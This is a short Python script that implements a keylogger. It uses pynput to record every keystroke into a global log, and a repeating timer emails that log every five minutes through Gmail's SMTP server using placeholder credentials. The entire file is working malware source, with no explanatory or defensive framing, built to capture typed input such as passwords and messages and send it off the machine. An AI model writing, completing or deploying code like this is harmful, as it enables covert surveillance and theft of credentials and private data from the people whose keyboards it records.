import pynput.keyboard
import threading
import smtplib

log = ""

def callback_func(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.enter:
            log = log + "\n"
        else:
            log = log + str(key)
    except KeyboardInterrupt:
        print("\nOK")
    except:
        print("Error")
    print(log)

def send_mail(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

def thread_func():
    global log
    send_mail("user@gmail.com","userpassword",log.encode("utf-8"))
    log = ""
    timer_object = threading.Timer(300,thread_func)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_func)
with keylogger_listener:
    thread_func()
    keylogger_listener.join()
